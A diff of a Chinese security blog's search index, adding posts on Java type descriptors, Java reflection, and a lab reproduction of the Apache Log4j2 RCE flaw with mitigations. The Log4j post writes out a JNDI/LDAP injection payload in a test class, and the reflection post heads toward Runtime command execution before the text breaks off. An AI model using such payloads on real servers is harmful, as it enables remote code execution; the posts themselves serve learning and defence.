@@ -86,6 +86,64 @@
       </tags>
   </entry>
   <entry>
+    <title>JAVA类型描述符</title>
+    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
+    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
+<p>其中有这么一段记录,如下:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
+
+<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
+<p>于是我写了个简单的打印字符串数组Demo:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+
+
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<p>我们在来看下Class的getName()方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终实现交给了getnamenative()方法。</p>
+<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
+<p>对于非数组类型:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+
+
+
+<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
+<p>对于数组类型；</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
+
+<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
+<p>我们来看看getName()方法的文档:</p>
+<ul>
+<li>对于原始数据类型，返回其 java 关键字</li>
+<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
+<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
+</ul>
+<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</title>
     <url>/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/</url>
     <content><![CDATA[<h1 id="Gitlab未授权命令执行漏洞复现-CVE-2021-22205"><a href="#Gitlab未授权命令执行漏洞复现-CVE-2021-22205" class="headerlink" title="Gitlab未授权命令执行漏洞复现(CVE-2021-22205)"></a>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</h1><hr>
@@ -224,53 +282,184 @@
       </tags>
   </entry>
   <entry>
-    <title>JAVA类型描述符</title>
-    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
-    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
-<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
-<p>其中有这么一段记录,如下:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
-
-<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
-<p>于是我写了个简单的打印字符串数组Demo:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果为:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+    <title>Apache Log4j2 RCE漏洞复现</title>
+    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
+<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
+<p>pom.xml文件如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-<p>我们在来看下Class的getName()方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最终实现交给了getnamenative()方法。</p>
-<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
-<p>对于非数组类型:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+<p>点击下载相应程序包资源</p>
+<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
+<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
+<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
+<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
-<p>对于数组类型；</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
-
-<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
-<p>我们来看看getName()方法的文档:</p>
+<p>运行结果:</p>
+<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
+<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
+<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
+<p><strong>已知影响组件</strong></p>
 <ul>
-<li>对于原始数据类型，返回其 java 关键字</li>
-<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
-<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
+<li>Apache Struts2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+<li>ElasticSearch</li>
+<li>flume</li>
+<li>dubbo</li>
+<li>Redis</li>
+<li>logstash</li>
+<li>kafka</li>
 </ul>
-<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
+<p>2、升级至 log4j-2.15.0-rc2： </p>
+<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
+<p>3、紧急缓解措施： </p>
+<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
+<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
+<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
+<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
+<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
+<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web容器漏洞</category>
+        <category>Apache</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java反射机制</title>
+    <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
+<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><blockquote>
+<p>反射这个词啊，就是事物对外部动作刺激作出的相应反馈。今天学习的是java反射，那这又是什么东东呢？跟着小透来领略java带来的震撼和有趣吧！</p>
+</blockquote>
+<p>Java反射机制就是在程序运行状态中，动态调用任意一个类及其该类的所有属性和方法。(说实话，我TM看到这个解释的时候，一脸？？？)</p>
+<p>下面我们将反射机制和直接类对象初始化作一个对比:</p>
+<p>下面是自己写的helloworld类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.fanseTest;</span><br><span class="line"></span><br><span class="line">public class helloworld</span><br><span class="line">&#123;</span><br><span class="line">       public void hello(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>直接类对象实例化</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      helloworld test = <span class="keyword">new</span> helloworld();</span><br><span class="line">      test.hello(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203210538333.png" class title="image-20211203210538333">
+
+
+
+<ul>
+<li>使用反射机制调用实例化</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fanse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        Class test = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Method test1 = test.getMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        Constructor constructor = test.getConstructor();</span><br><span class="line">        Object test2 = constructor.newInstance();</span><br><span class="line">        test1.invoke(test2, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203212216759.png" class title="image-20211203212216759">
+
+
+
+<p>我们可以从上面两个的对比来看，第一种是在运行前将类实例化成对象并调用方法赋值，第二种反射机制是在运行时动态调用方法和属性赋值。</p>
+<h2 id="反射的利弊"><a href="#反射的利弊" class="headerlink" title="反射的利弊"></a>反射的利弊</h2><p>Java反射机制(Reflection)是java非常重要的动态特性，我们不仅可以通过反射获取到任何类的方法(Methods)，成员变量(Fields)，构造方法(Constructors)等信息，还能动态创建任何类实例，</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
+<li><p>可扩展性</p>
+<p>应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。</p>
+</li>
+<li><p>类浏览器和可视化开发环境</p>
+<p>一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。</p>
+</li>
+<li><p>调试器和测试工具</p>
+<p>调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。</p>
+</li>
+</ul>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
+<li><p>性能开辟</p>
+<p>反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。</p>
+</li>
+<li><p>安全限制</p>
+<p>使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet。</p>
+</li>
+<li><p>内部暴露</p>
+<p>由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。</p>
+</li>
+</ul>
+<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>我们可以从上面的反射代码中观察到，第一句代码的操作是获取类Class对象，所以这里简单记录下获取Class对象发方法:</p>
+<ul>
+<li><p>类名.class.</p>
+<p>如:com.fanseTest.helloworld.class</p>
+</li>
+<li><p>Class.formName(“类名”).</p>
+<p>如:Class.forName(“com.fanseTest.helloworld”)</p>
+</li>
+<li><p>对象名.getClass().</p>
+<p>如:helloworld test &#x3D; new helloworld();        hello.getClass()</p>
+</li>
+<li><p>classloader.loadClass(“类名”)如:ClassLoader.getSystemClassLoader().loadClass(“com.fanseTest.helloworld”)</p>
+</li>
+</ul>
+<p>如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String str = <span class="string">&quot;com.fanseTest.helloworld&quot;</span>;</span><br><span class="line">        Class test =  helloworld.class;</span><br><span class="line">        Class test1 = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Class test2 = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        System.out.println(test.toString());</span><br><span class="line">        System.out.println(test1.toString());</span><br><span class="line">        System.out.println(test2.toString());</span><br><span class="line">        helloworld test3 = <span class="keyword">new</span> helloworld();</span><br><span class="line">        System.out.println(test3.getClass().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211204195824874.png" class title="image-20211204195824874">
+
+
+
+<p>值的注意的是，当我们获取数组类型的Class对象时，使用java类型描述符(类型描述符相关介绍参见<a href="https://www.haoyun.fit/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/">JAVA类型描述符 | 小透的少年江湖 (haoyun.fit)</a>)</p>
+<p>举个栗子:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; booleanArray = Class.forname(&quot;[Z&quot;);//获取布尔数组类对象</span><br><span class="line">Class&lt;?&gt; doubleArray = Class.forname(&quot;[D&quot;);//获取浮点数组类对象</span><br><span class="line">Class&lt;?&gt; byteArray = Class.forname(&quot;[B&quot;);//获取字节数组类对象</span><br><span class="line">Class&lt;?&gt; classArray = Class.forname(&quot;[Lclassname;&quot;);</span><br><span class="line">Class&lt;?&gt; cstringArray = Class.forname(&quot;[Ljava.lang.String;&quot;);//获取字符串数组类对象</span><br><span class="line">//[符号根据数组维度来添加</span><br></pre></td></tr></table></figure>
+
+<p>注:</p>
+<p>反射 调用内部类的时候需要使用$来代替.，如com.reflect.ReflectTest类中有一个叫做Hello的内部类，调用时将类名写成:com.reflect.ReflectTest$Hello。</p>
+<h2 id="RunTime反射"><a href="#RunTime反射" class="headerlink" title="RunTime反射"></a>RunTime反射</h2><p>学习了什么是java反射机制和java反射机制的优缺点，我就有了一个疑问？对于渗透测试代码审计来说，java反射的作用是什么？或者说怎么利用这个机制进行测试。在一些反序列化漏洞执行系统命令时可以调用Runtime等类执行本地命令编写漏洞利用代码、代码审计、绕过RASP方法等，还有后面要学习的内存马等。</p>
+<h3 id="本地命令执行"><a href="#本地命令执行" class="headerlink" title="本地命令执行"></a>本地命令执行</h3><p>执行本地命令:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span 